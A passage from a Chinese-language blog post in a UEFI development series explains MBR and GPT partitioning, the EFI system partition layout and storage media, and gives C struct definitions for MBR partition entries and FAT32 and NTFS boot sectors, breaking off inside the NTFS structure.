src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251212165342546.png" alt="image-20251212165342546"></p><h3 id="mbr大致结构图4"><a href="#MBR大致结构图4" class="headerlink" title="MBR大致结构图4"></a>MBR大致结构图4</h3><ul><li>在大致结构图1中有提到过，使用<code>MBR</code>磁盘分区只能有四个主分区。但是这个限制在不使用<code>GPT</code>型磁盘分区也可以绕过该限制</li><li>绕过该限制的方法就是将任意一个主分区当做一个扩展分区，进行分区的嵌套就可以绕过只能有四个主分区的限制了。</li><li>我们就以<code>主分区4</code>作为扩展分区来画出一个大致的图片，具体的还是在后面介绍。</li><li>这个图还是得注意一下文件系统和DBR其实是在同一个层面，这里只是简化了而已。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251208233633650.png" alt="image-20251208233633650"></p><h3 id="特殊情况的mbr结构"><a href="#特殊情况的MBR结构" class="headerlink" title="特殊情况的MBR结构"></a>特殊情况的MBR结构</h3><ul><li>当一块硬盘中有两个系统，那么这个硬盘的情况就比较特殊了，如下图所示。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251208234022748.png" alt="image-20251208234022748"></p><h2 id="gpt型"><a href="#GPT型" class="headerlink" title="GPT型"></a>GPT型</h2><p><code>GPT</code>型的磁盘分区格式比较复杂，这里来简单描述一下，<code>GPT</code>的磁盘分区格式以便画图能理解。对于<code>MBR</code>，它所在的位置就是磁盘的第一个扇区（每个扇区大小为512字节）。而<code>GPT</code>的磁盘分区格式，一共要占用<code>67</code>个扇区。</p><ul><li>在磁盘的开头需要使用<code>34</code>个扇区包括如下：<ul><li>第<code>1</code>个扇区：存放<code>Protective MBR</code>（保护型MBR），只要是用于兼容MBR的磁盘分区</li><li>第<code>2</code>个扇区：存放<code>GPT Header</code>，也就是<code>GPT</code>磁盘分区格式的头即标识符</li><li>第<code>3~34</code>个扇区：存放<code>GPT Partition Entries</code>，也就是GPT 分区项表，用来描述每一个分区的详细信息。</li></ul></li><li>在磁盘的结尾需要使用<code>33</code>个扇区，其使用部分如下：<ul><li>最后一个扇区：存放<code>Backup GPT Header</code>，也就是备份<code>GPT</code>头信息</li><li>倒数第<code>2~33</code>个扇区：存放<code>Backup GPT Partition Entries</code>，也就是备份的GPT分区项表。</li></ul></li></ul><p>注意：如果一个磁盘分区是<code>GPT</code>分区，那么其最好是使用<code>UEFI</code>进行启动。</p><h3 id="gpt大致结构图1"><a href="#GPT大致结构图1" class="headerlink" title="GPT大致结构图1"></a>GPT大致结构图1</h3><ul><li>如果一块硬盘采用<code>GPT</code>分区，那么它的分区结构大致如下：</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209141943108.png" alt="image-20251209141943108"></p><h3 id="gpt大致结构图2"><a href="#GPT大致结构图2" class="headerlink" title="GPT大致结构图2"></a>GPT大致结构图2</h3><ul><li>对于上面的图片中，只是为了方便理解一下GPT分区格式大致结构，接下来就需要稍微了解一下<code>GPT</code>分区格式是如何分区的。</li><li>首先<code>GPT</code>分区的相关信息都记录GPT分区项表中，该分区项表一共有<code>128</code>项表。对于这<code>128</code>项表，有以下几个注意点：</li></ul><blockquote><ol><li><code>GPT</code>分区表虽然有<code>128</code>项表，但是实际上是你使用多少分区就有多少分区在使用，其他分区还没被初始化。</li><li><code>GPT</code>分区表只标明分区的<code>起止</code>扇区，并没标明分区所使用的文件系统类型。</li><li><code>GPT</code>分区表的每一项都是固定<code>128</code>字节</li></ol></blockquote><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209145020493.png" alt="image-20251209145020493"></p><ul><li>假设我们现在有两个分区，那么就只有两个分区表项有相应的信息</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209145235665.png" alt="image-20251209145235665"></p><h3 id="gpt大致结构图3"><a href="#GPT大致结构图3" class="headerlink" title="GPT大致结构图3"></a>GPT大致结构图3</h3><ul><li>首先明确一点就是<code>GPT</code>磁盘分区格式主要就是用来兼容UEFI启动的。所以在GPT制作中有如下几个规范：</li></ul><blockquote><ol><li>需要有<code>EFI系统分区</code>（EFI System Partition），简称<code>ESP</code></li><li>对于<code>ESP</code>这个分区，其文件系统必须要求是<code>FAT32</code></li><li>分区项表中有一个分区类型 ，该分区类型在表示<code>ESP</code>分区的时候要设置为<code>EFI System Partition</code></li></ol></blockquote><ul><li>但是由于一般在编写<code>GPT</code>磁盘的时候，基本上都是把<code>ESP</code>放在第一个分区（其实并不强制放在第几个分区），并且对于<code>EFI</code>系统分区其实不止保持着<code>UEFI</code>程序，还有其他系统的启动程序</li></ul><blockquote><ol><li>下面这些<code>.efi</code>程序都是可执行文件，其作用都相当于一个引导程序，也就是<code>Bootloader</code>，该<code>Bootloader</code>运行在运行在UEFI 固件提供的环境下。</li><li>其中<code>bootx64.efi</code>其实就是，UEFI固件启动时默认寻找的<strong>标准启动程序</strong>，对于单个系统可以直接加载操作系统内核；而对于多个系统可能调用更高级的<code>Bootloader</code>来载入指定的操作系统内核。也就是<code>bootx64.efi</code>在执行的时候用户可以选择指定操作系统的<code>bootloader</code>。</li><li>对应目录中的<code>BCD</code>、<code>grub.cfg</code>文件都是对应<code>bootloader</code>的配置文件。</li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意：这些都是规定好的比如:bootx64.efi文件名字都是规定好的,也必须要放在/EFI/BOOT/这个文件目录下面</span></span><br><span class="line">ESP (FAT32)</span><br><span class="line">├─ /EFI</span><br><span class="line">│  ├─ /Boot</span><br><span class="line">│  │   └─ bootx64.efi       ← 默认启动程序</span><br><span class="line">│  ├─ /Microsoft</span><br><span class="line">│  │   ├─ bootmgfw.efi      ← Windows Boot Manager</span><br><span class="line">│  │   └─ BCD               ← Windows 启动配置</span><br><span class="line">│  ├─ /ubuntu</span><br><span class="line">│  │   ├─ grubx64.efi       ← GRUB 引导程序</span><br><span class="line">│  │   └─ grub.cfg</span><br><span class="line">│  └─ /fedora</span><br><span class="line">│     └─ shimx64.efi</span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209154919166.png" alt="image-20251209154919166"></p><h2 id="mbr与gpt兼容性"><a href="#MBR与GPT兼容性" class="headerlink" title="MBR与GPT兼容性"></a>MBR与GPT兼容性</h2><ul><li>对于<code>GPT</code>兼容<code>MBR</code>，下面一个图片可以大致说明，就是如下图所示的一个：<ul><li><code>GPT</code>中保护型<code>MBR</code>（其实就是<code>MBR</code>的结构），只不过其四个分区表项中只有一个在使用</li><li>保护型<code>MBR</code>分区标识为<code>0xEE</code>，并且这个分区大小通常是<code>0xFFFFFFFF</code>（32位），这样使得旧软件看到这个分区会认为磁盘已占用，避免<code>GPT</code>格式被破坏</li></ul></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209150046407.png" alt="image-20251209150046407"></p><h1 id="存储设备与原理"><a href="#存储设备与原理" class="headerlink" title="存储设备与原理"></a>存储设备与原理</h1><ul><li>存储设备这块内容算是比较偏向的是操作系统的内容，算是重新回顾一下操作系统。</li></ul><h2 id="磁存储"><a href="#磁存储" class="headerlink" title="磁存储"></a>磁存储</h2><h3 id="磁带与磁鼓"><a href="#磁带与磁鼓" class="headerlink" title="磁带与磁鼓"></a>磁带与磁鼓</h3><p>磁带在1928年就发明了，实际上磁带是一个纸带（今天一般都使用塑料），该纸带（塑料）上均匀粘上铁磁性颗粒</p><blockquote><ul><li>读取和写入都只需要一个机械部件（转动）定位，当实际上大多都是磁带转动<ul><li>读取：放大感应电流</li><li>写入：电磁头（电磁铁）改变磁畴化方向</li></ul></li><li>存储特性：<ul><li>价格低，廉价材料，几乎不涉及打规模集成电路</li><li>容量高</li><li>可靠性高（可以适当封装）</li></ul></li><li>读写性能：<ul><li>勉强可以顺序读写（需要等待定位）</li><li>随机读写几乎完全不行</li></ul></li><li>应用场景：冷数据的存档和备份</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209161912337.png" alt="image-20251209161912337"></p></blockquote><p>磁鼓是对磁带用作类似与内存的发展，但是速度还是比较慢，后面被淘汰（也是对磁带是否能用作随机读写的尝试）</p><blockquote><ul><li>用旋转的二维平面存储数据（无法内卷，容量变小）</li><li>读写延迟不会超过旋转周期（随机读写速度大幅提升）</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209162600620.png" alt="image-20251209162600620"></p></blockquote><h3 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h3><ul><li>结合磁带与磁鼓的优点就有了曾经很热门的存储设备<code>磁盘</code>，在二维平面上放置许多磁带。</li></ul><blockquote><ul><li>存储特性：<ul><li>价格低：高密度、低成本</li><li>容量高：2.5D，上万磁道</li><li>可靠性高（高速运转的机械部件是潜在的威胁）</li></ul></li><li>读写性能：<ul><li>顺序读写：较高</li><li>随机读写：勉强（需要定位）</li></ul></li><li>应用场景：计算机系统的主力数据存储（便宜，坏了还有可能修）</li><li>读写扇区：<ul><li>读写头需要到对应的磁道：<code>7200pm-&gt;120rps</code>，寻道时间大约为<code>8.3ms</code></li><li>转轴盘片旋转到读写头的位置：读写头移动时间通常也需要几个<code>ms</code></li><li>通过<code>缓存/调度</code>等缓解：比如著名的<code>电梯</code>调度算法（已经成为历史的尘埃）。</li></ul></li></ul></blockquote><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209162822656.png" alt="image-20251209162822656"></p><h3 id="软盘"><a href="#软盘" class="headerlink" title="软盘"></a>软盘</h3><p>软盘主要就是把读写头和盘片分开，实现数据的移动</p><h2 id="光存储"><a href="#光存储" class="headerlink" title="光存储"></a>光存储</h2><h3 id="光盘"><a href="#光盘" class="headerlink" title="光盘"></a>光盘</h3><h2 id="电存储"><a href="#电存储" class="headerlink" title="电存储"></a>电存储</h2><h3 id="闪存"><a href="#闪存" class="headerlink" title="闪存"></a>闪存</h3><h1 id="分区表结构"><a href="#分区表结构" class="headerlink" title="分区表结构"></a>分区表结构</h1><blockquote><p>接下来就要进入正题了，具体学习一些分区表的数据结构。对于取证而言需要掌握的是<code>MBR</code>、<code>DBR</code>、<code>EBR</code>，而对于<code>UEFI</code>开发来说，要熟练掌握的就是<code>GPT</code>磁盘分区表。</p></blockquote><h2 id="mbr分区表"><a href="#MBR分区表" class="headerlink" title="MBR分区表"></a>MBR分区表</h2><blockquote><ul><li>MBR全称也叫做<code>master-boot-record</code>，翻译过来就是<code>主引导记录</code>。</li><li>MBR是给硬盘分区的，其也被称为<code>DOS</code>分区表。<code>0</code>号扇区的主引导记录<code>MBR</code>。</li><li>DOS分区体系的硬盘用分区表记录每个分区的类型、起始位置和分区的大小，其中分区表就在<code>0</code>号扇区内，所以<code>0</code>号扇区如果损坏那么这个硬盘就不能正确识别分区。</li><li>MBR分区表主要由三部分组成：主引导记录代码（可执行代码）、主分区表项、签名标志，其偏移和大小如下图所示：</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209194103707.png" alt="image-20251209194103707"></p></blockquote><ul><li>下面就来具体介绍<code>MBR</code>分区表的具体结构，首先找一个镜像文件使用<code>Winhex</code>打开它（实在不行就打开磁盘的，但是要注意千万不能一不小心修改了什么东东），为了保险起见这里直接用别人博客上的图片。对于下面这张图片来说最重要的有两个：<code>DPT</code>硬盘分区表、分区有效标志<code>0x55AA</code></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/1776217-20201206001835300-1726886129.png" alt="img"></p><ul><li>对于学习<code>MBR</code>分区表，主要学习的就是<code>DPT</code>硬盘分区表，因为硬盘分区表中记录了四个主分区（如果有）的一些信息。而<code>DPT</code>硬盘分区表中的数据本质上是一个结构体数组，数组中的元素大小为<code>0x10</code>字节。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209195030928.png" alt="image-20251209195030928"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span>  boot_flag;      <span class="comment">// 0x80 = active, 0x00 = inactive</span></span><br><span class="line">    <span class="type">uint8_t</span>  start_chs[<span class="number">3</span>];   <span class="comment">// 起始 CHS（已基本废弃）</span></span><br><span class="line">    <span class="type">uint8_t</span>  partition_type; <span class="comment">// 分区类型 (0x07 NTFS, 0x83 Linux, 0xEE GPT)</span></span><br><span class="line">    <span class="type">uint8_t</span>  end_chs[<span class="number">3</span>];     <span class="comment">// 结束 CHS</span></span><br><span class="line">    <span class="type">uint32_t</span> start_lba;      <span class="comment">// 起始 LBA</span></span><br><span class="line">    <span class="type">uint32_t</span> sector_count;   <span class="comment">// 分区扇区数</span></span><br><span class="line">&#125; MBR_PartitionEntry;</span><br><span class="line"></span><br><span class="line">MBR_PartitionEntry DPT[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">partition_type这边还是需要详细说明一下的</span></span><br><span class="line"><span class="comment">0x00表示未使用</span></span><br><span class="line"><span class="comment">0x07表示NTFS文件系统</span></span><br><span class="line"><span class="comment">0x0B、0x0c表示FAT32文件系统</span></span><br><span class="line"><span class="comment">0x05、0x0F表示扩展分区</span></span><br><span class="line"><span class="comment">0x82表示Linux Swap</span></span><br><span class="line"><span class="comment">0x83表示Linux文件系统ext4等</span></span><br><span class="line"><span class="comment">0xEE表示GPT保护型MBR</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>名称</th><th>字节数</th><th>描述</th><th>偏移</th></tr></thead><tbody><tr><td>boot_flag</td><td>1</td><td>相当于标志位，0x00标示不可引导，0x80可引导（一般是系统盘）</td><td>0x00-0x00</td></tr><tr><td>start_chs</td><td>3</td><td>分区的起始CHS地址（由于CHS只能寻址到8G，早已淘汰不用，可空）</td><td>0x01-0x03</td></tr><tr><td>partition_type</td><td>1</td><td>分区的类型，0x00表示未使用，0x07表示NTFS文件系统，0x0c表示FAT32，0x83表示Linux文件系统ext4等，0x82表示Linux Swap，0x0F表示扩展分区，0xEE表示GPT保护型MBR</td><td>0x04-0x04</td></tr><tr><td>end_chs</td><td>3</td><td>结束CHS地址（可空）</td><td>0x05-0x07</td></tr><tr><td>start_lba</td><td>4</td><td>分区的起始扇区号</td><td>0x08-0x0B</td></tr><tr><td>sector_count</td><td>4</td><td>分区扇区数</td><td>0x0C-0x0F</td></tr></tbody></table></div><blockquote><p><strong>注意</strong>：</p><ol><li>由于分区扇区数存储的数据只有<code>4</code>字节，所以只能存储<code>4294967295</code>个扇区，如果每个扇区<code>512</code>字节的话，那每个主分区的大小最多只能是<code>4294967295 × 512</code>字节，约为<code>2T</code>，这就说明了使用<code>MBR</code>格式的分区大小最大只能是<code>2T</code>。随着技术的发展<code>2T</code>的硬盘很常见了，这就导致了<code>MBR</code>格式有点过时了。</li></ol></blockquote><h2 id="dbr分区表"><a href="#DBR分区表" class="headerlink" title="DBR分区表"></a>DBR分区表</h2><ul><li>参考博客：<a href="https://blog.csdn.net/Hilavergil/article/details/79270379">MBR、EBR与DBR详解_mbr dbr-CSDN博客</a></li></ul><blockquote><ul><li>大致了解了<code>DBR</code>分区表后，现在就可以来了解主分区中的，引导扇区<code>DBR</code>的结构。</li><li><code>DBR</code>也称为<code>VBR</code>，英文全称为<code>DOS Boot Record / Volume Boot Record</code>，对于不同的文件系统，<code>DBR</code>数据结构是不同的。</li><li>这里主要介绍两种文件系统的DBR表，分别是<code>NTFS</code>文件系统和<code>FAT</code>文件系统的DBR表</li><li>绝大多数文件系统的<code>DBR</code>在逻辑上就是一个扇区，但是可能会有<code>扩展引导区</code>。这边DBR分区表，只简单的列出其数据结构，详细的讲解在文件系统中会讲解。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251209204025987.png" alt="image-20251209204025987"></p></blockquote><h3 id="fat文件系统dbr"><a href="#FAT文件系统DBR" class="headerlink" title="FAT文件系统DBR"></a>FAT文件系统DBR</h3><ul><li><p>为了先做完取证实验，就先来学习<code>FAT</code>文件系统的<code>DBR</code>，这里对着别人博客的结构体敲一遍吧。首先先来看这个结构体。</p></li><li><p>先来看看<code>FAT</code>文件系统的DBR总体结构</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FAT32_DBR</span>&#123;</span></span><br><span class="line">    BYTE JumpInstruction[<span class="number">3</span>]; <span class="comment">// 0x00,跳转指令,通常为0xEB5890,其中58指示了跳转位置,在x86中,58+2就代表了跳转到5A处</span></span><br><span class="line">    BYTE OEMID[<span class="number">8</span>];  <span class="comment">// 0x03,厂商标识和OS版本信息</span></span><br><span class="line">    Basic_BPB BPB;  <span class="comment">// 0x0B BIOS Parameter Block,BIOS参数块.FAT 文件系统中最核心的一块结构</span></span><br><span class="line">    FAT32_Extend_BPB Extend_BPB;  <span class="comment">// 0x40 扩展BPB</span></span><br><span class="line">    BYTE Boot_Strap[<span class="number">420</span>];  <span class="comment">// 0x5A,文件系统引导代码</span></span><br><span class="line">    BYTE endSignature[<span class="number">2</span>];  <span class="comment">// 0x01FE,结束标识,固定为0x55  0xAA</span></span><br><span class="line">&#125;FAT32_DBR, *pFAT32_DBR;</span><br></pre></td></tr></table></figure><ul><li><code>Basic_BPB</code>结构体如下。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Basic_BPB</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Bytes_per_Sector; <span class="comment">// 0xB~0xC</span></span><br><span class="line">    BYTE Sectors_per_Cluster; <span class="comment">// 0xD</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Reserved_Sector; <span class="comment">// 0xE~0xF保留扇区</span></span><br><span class="line">    BYTE FATs;  <span class="comment">//0x10</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> RootEntry;  <span class="comment">// 0x11~0x12</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Small_Sector; <span class="comment">// 0x13~0x14</span></span><br><span class="line">    BYTE Media; <span class="comment">// 0x15</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Sector_per_FAT_FAT16; <span class="comment">// 0x16~0x17</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Sector_per_Track; <span class="comment">// 0x18~0x19</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Heads;  <span class="comment">// 0x1A~0x1B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Hidden_Sector; <span class="comment">// 0x1C~0x1F</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Large_Sector;  <span class="comment">// 0x20~0x23</span></span><br><span class="line"></span><br><span class="line">    FAT32_Sector Fat32_Sector;</span><br><span class="line">&#125;Basic_BPB, *pBasic_BPB;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FAT32_Sector</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Sectors_per_FAT_FAT32; <span class="comment">// 0x24~0x27</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Extend_Flag;  <span class="comment">// 0x28~0x29</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> FS_Version;  <span class="comment">// 0x2A~0x2B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Root_Cluster_Number; <span class="comment">// 0x2C~0x2F</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> FS_Info_Sector; <span class="comment">// 0x30~0x31</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Backup_Sector;  <span class="comment">// 0x32~0x33</span></span><br><span class="line">    BYTE Reserved_Sector[<span class="number">12</span>]; <span class="comment">// 0x34~0x3F</span></span><br><span class="line">&#125;FAT32_Sector, *pFAT32_Sector;</span><br></pre></td></tr></table></figure><ul><li><code>FAT32_Extend_BPB</code>结构体</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FAT32_Extend_BPB</span>&#123;</span></span><br><span class="line">    BYTE Physical_Drive; <span class="comment">// 0x40</span></span><br><span class="line">    BYTE Reserved;  <span class="comment">// 0x41</span></span><br><span class="line">    BYTE Extend_Signure; <span class="comment">// 0x42</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Vol_Serial; <span class="comment">// 0x43~0x46</span></span><br><span class="line">    BYTE Vol_Label[<span class="number">11</span>]; <span class="comment">// 0x47~0x51</span></span><br><span class="line">    BYTE System_ID[<span class="number">8</span>]; <span class="comment">// 0x52~0x59</span></span><br><span class="line">&#125;FAT32_Extend_BPB, *pFAT32_Extend_BPB;</span><br></pre></td></tr></table></figure><h3 id="ntfs文件系统dbr"><a href="#NTFS文件系统DBR" class="headerlink" title="NTFS文件系统DBR"></a>NTFS文件系统DBR</h3><ul><li>NTFS文件系统中<code>DBR</code>的结构体如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NTFSDBR</span>&#123;</span></span><br><span class="line">    BYTE JMP[<span class="number">3</span>];  <span class="comment">// 0x0~0x2</span></span><br><span class="line">    BYTE FsID[<span class="number">8</span>]; <span class="comment">// 0x3~0xA</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> bytePerSector;  <span class="comment">// 0xB~0xC</span></span><br><span class="line">    BYTE secPerCluster;  <span class="comment">// 0xD</span></span><br><span class="line">    BYTE reservedBytes[<span class="number">2</span>];  <span class="comment">// 0xE~0xF  </span></span><br><span class="line">    BYTE zeroBytes[<span class="number">3</span>];  <span class="comment">// 0x10~0x12</span></span><br><span class="line">    BYTE unusedBytes1[<span class="number">2</span>]; <span class="comment">// 0x13~0x14</span></span><br><span class="line">    BYTE mediaType;  <span class="comment">// 0x15</span></span><br><span class="line">    BYTE unusedBytes2[<span class="number">2</span>];  <span class="comment">// 0x16~0x17</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> secPerTrack; <span class="comment">// 0x18~0x19</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Heads;  <span class="comment">// 0x1A~0x1B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hideSectors;  <span class="comment">// 0x1C~0x0x1F</span></span><br><span class="line">    BYTE unusedByte3[<span class="number">4</span>];  <span class="comment">// 0x20~0x23</span></span><br><span class="line">    BYTE usedBytes[<span class="number">4</span>];  <span class="comment">// 0x24~0x27</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 totalSectors; <span class="comment">// 0x28~0x2F</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 MFT;  <span class="comment">// 